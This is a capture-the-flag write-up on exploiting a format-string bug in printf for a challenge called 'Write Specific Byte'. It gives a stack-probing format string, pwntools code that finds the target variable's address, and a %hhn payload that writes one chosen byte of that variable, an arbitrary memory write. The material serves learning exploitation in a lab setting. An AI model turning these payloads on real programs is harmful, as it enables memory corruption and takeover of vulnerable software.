# Challenge `Write Specific Byte` Writeup

- Vulnerability: 
  - Format strings
- Where:
  - printf function
- Impact:
  - allows to write in arbitrary memory

## Steps to Reproduce

Sending the following format string
```
"AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
```
we can verify that the 7th register is filled with `41414141` (the value of `AAAA`) which tells us that we control the 7th register.

To get the address of the `target` variable we use:
```py
elf = ELF("05_write_specific_byte")
target_address = elf.symbols['target']
```

This time, we must write to the most significant byte of the target variable. Knowing that the address of the target variable points to the least significant byte, we can write the address of the target variable plus 3 to the 7th register and then use the `%n` specifier to write any value.

```py
io = connect(HOST, PORT)
payload = p32(target_address + 3) + b"%254x%7$hhn"
io.sendline(payload)
```

## Implementation

Implementation [here](write-specific-byte.py).